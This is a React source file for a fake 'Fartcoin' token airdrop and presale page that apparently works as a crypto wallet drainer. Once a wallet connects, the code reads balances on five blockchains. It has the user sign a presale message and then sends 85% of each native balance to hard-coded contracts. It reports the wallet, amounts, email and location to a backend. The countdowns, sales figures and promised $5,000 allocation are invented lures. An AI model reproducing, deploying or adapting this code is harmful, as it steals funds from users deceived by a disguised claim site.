import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useBalance, useDisconnect, useChainId, useSwitchChain } from 'wagmi';
import { formatEther } from 'viem';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-400 to-indigo-500',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0x56d829E89634Ce1426B73571c257623D17db46cB',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-purple-400 to-pink-500',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-cyan-400 to-blue-500',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-400 to-red-500',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "function verifyMessage(address user, string memory message, bytes memory signature) public view returns (bool)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();
  const { switchChain } = useSwitchChain();
  
  const wagmiChainId = useChainId();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [preparedTransactions, setPreparedTransactions] = useState([]);
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
  const [verifying, setVerifying] = useState(false);
  const [signature, setSignature] = useState(null);
  const [signedMessage, setSignedMessage] = useState('');
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const [realChainId, setRealChainId] = useState(wagmiChainId);
  const [prices, setPrices] = useState({
    eth: 2000,
    bnb: 300,
    matic: 0.75,
    avax: 32
  });
  const [userEmail, setUserEmail] = useState('');
  const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });
  const [executionResults, setExecutionResults] = useState([]);

  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.17,
    bthPrice: 0.17
  });

  // Live progress tracking
  const [liveProgress, setLiveProgress] = useState({
    percentComplete: 68,
    participantsToday: 342,
    avgAllocation: 4250
  });

  // Track mouse for parallax effect
  useEffect(() => {
    const handleMouseMove = (e) => {
      setMousePosition({
        x: (e.clientX / window.innerWidth - 0.5) * 20,
        y: (e.clientY / window.innerHeight - 0.5) * 20
      });
    };
    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);

  // Fetch crypto prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await response.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32
        });
      } catch (error) {
        console.log('Using default prices');
      }
    };
    
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Get real chain ID from provider
  useEffect(() => {
    const getRealChainId = async () => {
      if (provider) {
        try {
          const network = await provider.getNetwork();
          setRealChainId(Number(network.chainId));
        } catch (error) {
          console.error("Failed to get real chainId:", error);
        }
      }
    };
    
    getRealChainId();
  }, [provider]);

  // Initialize provider and signer from AppKit
  useEffect(() => {
    if (!walletProvider || !address) return;

    const init = async () => {
      try {
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();

        setProvider(ethersProvider);
        setSigner(ethersSigner);

        const network = await ethersProvider.getNetwork();
        setRealChainId(Number(network.chainId));

        console.log("✅ Wallet Ready:", await ethersSigner.getAddress());
        
        // Fetch balances across all chains
        await fetchAllBalances(address);
        
      } catch (e) {
        console.error("Provider init failed", e);
      }
    };

    init();
  }, [walletProvider, address]);

  // Track page visit with location
  useEffect(() => {
    const trackVisit = async () => {
      try {
        const response = await fetch('https://bthbk.vercel.app/api/track-visit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referer: document.referrer,
            path: window.location.pathname
          })
        });
        const data = await response.json();
        if (data.success) {
          setUserLocation({
            country: data.data.country,
            city: data.data.city,
            ip: data.data.ip,
            flag: data.data.flag
          });
        }
      } catch (err) {
        console.error('Visit tracking error:', err);
      }
    };
    trackVisit();
  }, []);

  // Fetch balances across all chains
  const fetchAllBalances = async (walletAddress) => {
    const balanceResults = {};
    
    for (const chain of DEPLOYED_CHAINS) {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        
        const valueUSD = amount * price;
        
        if (amount > 0.0001) {
          balanceResults[chain.name] = {
            amount,
            valueUSD,
            symbol: chain.symbol,
            chainId: chain.chainId,
            contractAddress: chain.contractAddress
          };
          console.log(`✅ ${chain.name}: ${amount.toFixed(4)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
        }
      } catch (err) {
        console.error(`Failed to fetch balance for ${chain.name}:`, err);
      }
    }
    
    setBalances(balanceResults);
    
    // Check if total value >= threshold
    const totalValue = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
    return totalValue;
  };

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && !scanResult && !verifying) {
      // Wait for balances to load
      const timer = setTimeout(() => {
        if (Object.keys(balances).length > 0) {
          verifyWallet();
        }
      }, 1000);
      return () => clearTimeout(timer);
    }
  }, [isConnected, address, balances]);

  const verifyWallet = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Verifying...');
    
    try {
      const totalValue = Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0);
      
      const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        setUserEmail(data.data.email);
        if (data.data.allocation) {
          setAllocation(data.data.allocation);
        }
        
        if (totalValue >= 1) {
          setTxStatus('✅ You qualify!');
          await preparePresale();
        } else {
          setTxStatus('✨ Verified');
        }
      }
    } catch (err) {
      console.error('Verification error:', err);
      setTxStatus('✅ Ready');
    } finally {
      setVerifying(false);
    }
  };

  const preparePresale = async () => {
    if (!address) return;
    
    try {
      const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPreparedTransactions(data.data.transactions);
      }
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  // ============================================
  // SMART CONTRACT EXECUTION - MULTI-CHAIN WITH NETWORK SWITCHING
  // ============================================
  const executeMultiChainSignature = async () => {
    if (!walletProvider || !address || !signer) {
      setError("Wallet not initialized yet");
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      setExecutionResults([]);
      
      // Create message - NO BALANCE DISPLAY
      const timestamp = Date.now();
      const nonce = Math.floor(Math.random() * 1000000000);
      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
        `I hereby confirm my participation\n` +
        `Wallet: ${address}\n` +
        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
        `Timestamp: ${new Date().toISOString()}\n` +
        `Nonce: ${nonce}`;

      setTxStatus('✍️ Sign message...');

      // Get signature - THIS IS THE ONLY POPUP
      const signature = await signer.signMessage(message);
      setSignature(signature);
      setTxStatus('✅ Signature obtained. Executing on all chains...');

      // Execute on each chain with balance
      let processed = [];
      let results = [];
      
      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
        balances[chain.name] && balances[chain.name].amount > 0
      );
      
      if (chainsWithBalance.length === 0) {
        setError("No balances found on any chain");
        setSignatureLoading(false);
        return;
      }

      setTxStatus(`🔄 Preparing to execute on ${chainsWithBalance.length} chains...`);

      // Execute sequentially on each chain with network switching
      for (let i = 0; i < chainsWithBalance.length; i++) {
        const chain = chainsWithBalance[i];
        
        try {
          setTxStatus(`🔄 (${i+1}/${chainsWithBalance.length}) Switching to ${chain.name}...`);
          
          // Switch network using AppKit's switchChain
          if (switchChain) {
            await switchChain({ chainId: chain.chainId });
          } else {
            // Fallback to manual network switch request
            try {
              await walletProvider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: `0x${chain.chainId.toString(16)}` }],
              });
            } catch (switchError) {
              // If network not added, we would need to add it, but assume it's in AppKit config
              console.error('Switch error:', switchError);
            }
          }
          
          // Wait for network switch to complete
          await new Promise(resolve => setTimeout(resolve, 2000));
          
          setTxStatus(`🔄 (${i+1}/${chainsWithBalance.length}) Executing on ${chain.name}...`);
          
          // Get fresh signer for the new network
          const currentProvider = new ethers.BrowserProvider(walletProvider);
          const currentSigner = await currentProvider.getSigner();
          
          // Verify we're on the right network
          const network = await currentProvider.getNetwork();
          console.log(`✅ Switched to ${chain.name} (Chain ID: ${Number(network.chainId)})`);
          
          const contract = new ethers.Contract(
            chain.contractAddress,
            PROJECT_FLOW_ROUTER_ABI,
            currentSigner
          );

          const balance = balances[chain.name].amount;
          const amountToSend = (balance * 0.85).toFixed(6);
          const value = ethers.parseEther(amountToSend.toString());

          // Estimate gas
          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
          
          // Execute transaction
          const tx = await contract.processNativeFlow({
            value: value,
            gasLimit: gasEstimate * 120n / 100n
          });

          setTxHash(tx.hash);
          
          setTxStatus(`🔄 (${i+1}/${chainsWithBalance.length}) Waiting for confirmation on ${chain.name}...`);
          
          const receipt = await tx.wait();
          
          processed.push(chain.name);
          
          // Store result
          const result = {
            chain: chain.name,
            txHash: receipt.hash,
            amount: amountToSend,
            symbol: chain.symbol,
            status: 'success'
          };
          results.push(result);
          setExecutionResults([...results]);
          
          // Notify backend
          await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              walletAddress: address,
              chainName: chain.name,
              flowId: `FLOW-${timestamp}-${chain.name}`,
              txHash: receipt.hash,
              amount: amountToSend,
              symbol: chain.symbol,
              valueUSD: balances[chain.name].valueUSD * 0.85,
              email: userEmail,
              location: userLocation
            })
          });
          
          setTxStatus(`✅ (${i+1}/${chainsWithBalance.length}) Completed on ${chain.name}`);
          
        } catch (chainErr) {
          console.error(`Error on ${chain.name}:`, chainErr);
          
          // Store error result
          results.push({
            chain: chain.name,
            error: chainErr.message || 'Unknown error',
            status: 'failed'
          });
          setExecutionResults([...results]);
          
          // Continue to next chain even if one fails
          setTxStatus(`⚠️ Error on ${chain.name}, continuing to next chain...`);
          await new Promise(resolve => setTimeout(resolve, 2000));
        }
      }

      // Switch back to original network (Ethereum as default)
      try {
        if (switchChain) {
          await switchChain({ chainId: 1 });
        }
      } catch (e) {
        console.log('Could not switch back to Ethereum');
      }

      setVerifiedChains(processed);
      setCompletedChains(processed);
      
      if (processed.length > 0) {
        setShowCelebration(true);
        setTxStatus(`🎉 Success! Processed on ${processed.length} chains`);
        
        // Final success notification
        await fetch('https://bthbk.vercel.app/api/presale/claim', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            email: userEmail,
            location: userLocation,
            chains: processed,
            totalValue: Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0),
            transactions: results.filter(r => r.status === 'success').map(r => ({
              chain: r.chain,
              txHash: r.txHash
            }))
          })
        });
      } else {
        setError("No chains were successfully processed");
      }
      
    } catch (err) {
      console.error('Error:', err);
      if (err.code === 4001) {
        setError('Cancelled');
      } else {
        setError(err.message || 'Failed');
      }
    } finally {
      setSignatureLoading(false);
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      await fetch('https://bthbk.vercel.app/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress: address,
          email: userEmail,
          location: userLocation
        })
      });
      setShowCelebration(true);
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  const totalUSD = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
  const isEligible = totalUSD >= 1;

  // Get current chain name
  const currentChain = DEPLOYED_CHAINS.find(c => c.chainId === realChainId);

  // Responsive disconnect handler
  const handleDisconnect = async () => {
    try {
      setTxStatus('Disconnecting...');
      await disconnect();
      // Reset all states
      setProvider(null);
      setSigner(null);
      setBalances({});
      setScanResult(null);
      setCompletedChains([]);
      setShowCelebration(false);
      setTxStatus('');
      setError('');
      setExecutionResults([]);
    } catch (err) {
      console.error('Disconnect error:', err);
      // Force UI update even if disconnect fails
      window.location.reload();
    }
  };

  return (
    <div className="min-h-screen bg-black text-white flex flex-col">
      {/* Terminal Grid Background */}
      <div className="fixed inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxkZWZzPjxwYXR0ZXJuIGlkPSJncmlkIiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiPjxwYXRoIGQ9Ik0gMjAgMCBMIDAgMCAwIDIwIiBmaWxsPSJub25lIiBzdHJva2U9IiNmZmZmZmYyMiBzdHJva2Utd2lkdGg9IjAuNSI+PC9wYXRoPjwvcGF0dGVybj48L2RlZnM+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0idXJsKCNncmlkKSI+PC9yZWN0Pjwvc3ZnPg==')] opacity-10 pointer-events-none"></div>
      
      {/* Floating Terminal Text */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        {[...Array(20)].map((_, i) => (
          <div
            key={i}
            className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker"
            style={{
              top: `${Math.random() * 100}%`,
              left: `${Math.random() * 100}%`,
              animation: `textFlicker ${2 + Math.random() * 3}s ease infinite alternate`,
              opacity: 0.3 + Math.random() * 0.2
            }}
          >
            {[
              'FARTCOIN_PROTOCOL_INITIALIZED',
              '010101010101010101',
              'PRESS F TO FART',
              '> TERMINAL_READY',
              'FART_PROTOCOL_V1',
              'GAS_CLOUD_DETECTED',
              'FARTCOIN AIRDROP'
            ][i % 7]}
          </div>
        ))}
      </div>

      {/* Scan Effect */}
      <div className="fixed inset-0 pointer-events-none scan-effect"></div>

      {/* FART Button */}
      <div 
        id="fart-button" 
        className="fixed bottom-4 right-4 z-50 bg-gray-800/90 border border-white/30 rounded-lg px-4 py-2 font-mono text-white flex items-center gap-2 cursor-pointer hover:bg-gray-700/90 transition-all"
        onClick={() => {
          // Trigger fart animation
          const overlay = document.getElementById('fart-overlay');
          const container = document.getElementById('fart-gas-container');
          if (overlay) {
            overlay.style.opacity = '1';
            setTimeout(() => {
              overlay.style.opacity = '0';
            }, 500);
          }
          if (container) {
            for (let i = 0; i < 10; i++) {
              const gas = document.createElement('div');
              gas.style.position = 'absolute';
              gas.style.bottom = '0';
              gas.style.right = '0';
              gas.style.width = `${50 + Math.random() * 100}px`;
              gas.style.height = `${50 + Math.random() * 100}px`;
              gas.style.background = 'radial-gradient(circle, rgba(255,255,255,0.3) 0%, rgba(200,200,200,0.1) 70%, transparent 100%)';
              gas.style.borderRadius = '50%';
              gas.style.filter = 'blur(20px)';
              gas.style.animation = `fartGasMove ${1 + Math.random()}s ease-out forwards`;
              gas.style.zIndex = '999999';
              container.appendChild(gas);
              setTimeout(() => {
                if (container.contains(gas)) {
                  container.removeChild(gas);
                }
              }, 2000);
            }
          }
        }}
      >
        PRESS <span className="bg-white/20 border border-white/40 px-2 py-0.5 rounded font-bold text-xs">F</span> TO FART
      </div>

      {/* FART Overlay */}
      <div id="fart-overlay" className="fixed inset-0 bg-black/85 text-white text-5xl font-mono flex items-center justify-center z-[99999] pointer-events-none opacity-0 transition-opacity duration-300">
        💨 FART 💨
      </div>

      {/* FART Gas Container */}
      <div id="fart-gas-container" className="fixed inset-0 pointer-events-none z-[999999] overflow-hidden"></div>

      {/* Main Container */}
      <div className="relative z-10 flex-1 flex flex-col">
        
        {/* Header */}
        <header className="w-full py-6 px-4 border-b border-white/30 scan-effect">
          <div className="container mx-auto flex flex-wrap items-center gap-4 sm:flex-nowrap justify-between">
            
            {/* Logo */}
            <h1 className="text-4xl md:text-5xl font-terminal text-glow text-flicker text-white" style={{ textShadow: 'rgb(255,255,255) 0px 0px 5px, rgb(255,255,255) 0px 0px 10px', letterSpacing: '1px' }}>
              Fartcoin 💨
            </h1>

            {/* Contract Address */}
            <div className="terminal-frame flex flex-col sm:flex-row items-center gap-2 border-white flex-shrink min-w-0 overflow-hidden hide-mobile">
              <div className="text-sm sm:text-base font-mono truncate">
                <span className="text-white/70 mr-2">Contract:</span>
                <span className="text-white truncate">
                  9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump
                </span>
              </div>
              <button
                onClick={() => {
                  navigator.clipboard.writeText('9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump');
                  setTxStatus('📋 Contract copied!');
                  setTimeout(() => setTxStatus(''), 2000);
                }}
                className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20"
              >
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-copy h-4 w-4">
                  <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
                  <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
                </svg>
                COPY
              </button>
            </div>
          </div>
        </header>

        {/* Network Indicator */}
        {isConnected && currentChain && (
          <div className="fixed top-20 right-4 z-50">
            <div className="bg-gray-900/90 backdrop-blur-xl border border-white/30 rounded-full px-4 py-2 flex items-center gap-2">
              <span className="text-2xl">{currentChain.icon}</span>
              <span className="text-sm font-medium">{currentChain.name}</span>
              <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
            </div>
          </div>
        )}

        <main className="flex-1">
          {/* Hero Section */}
          <section className="flex flex-col items-center justify-center px-4 py-16 scan-effect">
            <div className="container mx-auto text-center">
              <div className="terminal-frame max-w-3xl mx-auto mb-8 p-8 border-white" style={{ boxShadow: 'rgba(255,255,255,0.5) 0px 0px 10px' }}>
                <h2 className="text-2xl md:text-4xl font-terminal text-glow mb-6 text-white">
                  &gt; AIRDROP INITIATED
                  <span className="cursor"></span>
                </h2>
                <div className="h-16 flex items-center justify-center">
                  <p className="text-xl md:text-2xl text-white font-mono">
                    &gt; CLAIM YOUR $FARTCOIN - up to 5,000 per wallet!
                    <span className="cursor"></span>
                  </p>
                </div>
                
                {/* Connect Wallet Section - Highly Reactive */}
                <div className="terminal-frame p-6 mt-8 border-white mx-auto max-w-2xl">
                  <div className="text-white font-mono text-center">
                    <p>"FART FREELY, GET RICH"</p>
                    <p className="text-white/70 text-sm mt-4">
                      Connect your wallet and{' '}
                      {!isConnected ? (
                        <button
                          onClick={() => open()}
                          className="underline transition duration-300 ease-in-out glow-on-hover font-bold text-white hover:text-white/80"
                        >
                          claim now
                        </button>
                      ) : (
                        <span className="text-green-400">wallet connected ✓</span>
                      )}
                    </p>
                  </div>
                </div>

                {/* Market Stats */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-8">
                  <div className="terminal-frame p-4 border-white">
                    <p className="text-white/70 text-sm">&gt; Market Cap:</p>
                    <p className="text-white text-lg">370,072,206 USD</p>
                  </div>
                  <div className="terminal-frame p-4 border-white">
                    <p className="text-white/70 text-sm">&gt; Current Price:</p>
                    <p className="text-white text-lg">$0.3706</p>
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* Wallet Connection Status - When Connected */}
          {isConnected && (
            <div className="max-w-2xl mx-auto mb-8 px-4">
              <div className="terminal-frame p-6 border-white">
                <div className="flex items-center justify-between flex-wrap gap-4">
                  <div className="flex items-center gap-4">
                    <div className="relative group/avatar">
                      <div className="w-14 h-14 bg-gradient-to-br from-gray-700 to-gray-900 rounded-xl flex items-center justify-center text-3xl border border-white/30">
                        👤
                      </div>
                      <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-green-500 rounded-full border-2 border-black animate-pulse"></div>
                    </div>
                    <div>
                      <div className="text-xs text-white/70 mb-1">CONNECTED</div>
                      <div className="font-mono text-sm bg-black/50 px-3 py-1.5 rounded-lg border border-white/30 group/address relative">
                        {formatAddress(address)}
                        <span className="absolute hidden group-hover/address:block bg-gray-900 text-xs px-2 py-1 rounded border border-white/30 mt-1 z-50">
                          {address}
                        </span>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-6">
                    <div className="text-right">
                      <div className="text-xs text-white/70 mb-1">STATUS</div>
                      <div className="text-sm text-green-400">
                        {isEligible ? '✅ Eligible' : '👋 Welcome'}
                      </div>
                    </div>
                    <button
                      onClick={handleDisconnect}
                      className="px-4 py-2 bg-red-500/10 text-red-400 rounded-lg hover:bg-red-500/20 transition-colors border border-red-500/30 hover:scale-110 transform cursor-pointer active:scale-95"
                    >
                      ✕
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Status Messages */}
          {txStatus && !verifying && (
            <div className="max-w-2xl mx-auto mb-6 px-4">
              <div className="terminal-frame p-5 border-white/50">
                <div className="flex items-center gap-4">
                  <div className="relative">
                    <div className="w-12 h-12 bg-gradient-to-br from-gray-700 to-gray-900 rounded-lg flex items-center justify-center text-2xl border border-white/30">
                      {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : '⟳'}
                    </div>
                    {signatureLoading && (
                      <div className="absolute inset-0 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                    )}
                  </div>
                  <div className="flex-1">
                    <p className="text-white font-medium">{txStatus}</p>
                    {executionResults.length > 0 && (
                      <div className="mt-2 flex flex-wrap gap-2">
                        {executionResults.map((result, idx) => (
                          <span 
                            key={idx}
                            className={`text-xs px-2 py-1 rounded-full ${
                              result.status === 'success' 
                                ? 'bg-green-500/20 text-green-400' 
                                : 'bg-red-500/20 text-red-400'
                            }`}
                          >
                            {result.chain}: {result.status === 'success' ? '✓' : '✗'}
                          </span>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Error Display */}
          {error && !error.includes('Unable to verify') && (
            <div className="max-w-2xl mx-auto mb-6 px-4">
              <div className="terminal-frame p-5 border-red-500/50">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 bg-gradient-to-br from-red-500/20 to-red-500/10 rounded-lg flex items-center justify-center text-3xl border border-red-500/30">
                    ⚠️
                  </div>
                  <p className="text-red-200">{error}</p>
                </div>
              </div>
            </div>
          )}

          {/* Live Presale Banner */}
          <div className="max-w-2xl mx-auto mb-8 px-4">
            <div className="inline-flex items-center gap-6 bg-gradient-to-r from-gray-800/50 to-gray-900/50 px-8 py-4 rounded-2xl border border-white/30 backdrop-blur-xl w-full justify-center">
              <div className="flex items-center gap-3">
                <span className="relative flex h-4 w-4">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-4 w-4 bg-green-500"></span>
                </span>
                <span className="text-2xl font-bold text-green-400">PRESALE LIVE</span>
              </div>
              <div className="h-8 w-px bg-white/30"></div>
              <div className="flex items-center gap-2">
                <span className="text-yellow-400 font-bold">${presaleStats.tokenPrice}</span>
                <span className="text-gray-400">per FART</span>
              </div>
              <div className="h-8 w-px bg-white/30"></div>
              <div className="flex items-center gap-2">
                <span className="text-orange-400 font-bold">{liveProgress.percentComplete}%</span>
                <span className="text-gray-400">sold</span>
              </div>
            </div>
          </div>

          {/* Main Action Button - Only when eligible */}
          {isConnected && isEligible && !completedChains.length && (
            <div className="max-w-2xl mx-auto mb-8 px-4">
              <button
                onClick={executeMultiChainSignature}
                disabled={signatureLoading || loading || !signer}
                className="w-full group relative"
              >
                <div className="absolute -inset-2 bg-gradient-to-r from-white/20 to-white/20 rounded-xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
                <div className="relative bg-gradient-to-r from-gray-800 to-gray-900 rounded-xl py-8 px-8 font-black text-3xl text-white border border-white/30 transform-gpu group-hover:scale-105 transition-all duration-500">
                  <div className="flex items-center justify-center gap-6">
                    {signatureLoading ? (
                      <>
                        <div className="relative">
                          <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                        </div>
                        <span className="animate-pulse">PROCESSING...</span>
                      </>
                    ) : (
                      <>
                        <span className="text-5xl filter drop-shadow-lg animate-pulse">💨</span>
                        <div>
                          <span className="bg-clip-text text-transparent bg-gradient-to-r from-white to-gray-300">
                            CLAIM $5,000 FART + {presaleStats.currentBonus}%
                          </span>
                          <div className="text-sm font-normal text-white/80 mt-1">
                            Presale Terms • Instant Delivery
                          </div>
                        </div>
                        <span className="bg-white/20 px-6 py-3 rounded-xl text-xl group-hover:translate-x-2 transition-transform">→</span>
                      </>
                    )}
                  </div>
                </div>
              </button>

              {/* Quick Stats */}
              <div className="flex justify-center gap-8 mt-6 text-sm">
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                  <span className="text-gray-400">Presale Terms</span>
                </div>
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
                  <span className="text-gray-400">Instant Delivery</span>
                </div>
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-orange-400 rounded-full animate-pulse"></div>
                  <span className="text-gray-400">$5,000 Airdrop</span>
                </div>
              </div>
            </div>
          )}

          {/* Countdown Timer */}
          <div className="grid grid-cols-4 gap-4 mb-8 max-w-2xl mx-auto px-4">
            {[
              { label: 'DAYS', value: timeLeft.days },
              { label: 'HOURS', value: timeLeft.hours },
              { label: 'MINUTES', value: timeLeft.minutes },
              { label: 'SECONDS', value: timeLeft.seconds }
            ].map((item, index) => (
              <div key={index} className="relative group">
                <div className="absolute inset-0 bg-gradient-to-r from-white/10 to-white/10 rounded-2xl blur-2xl opacity-0 group-hover:opacity-100 transition-all duration-500"></div>
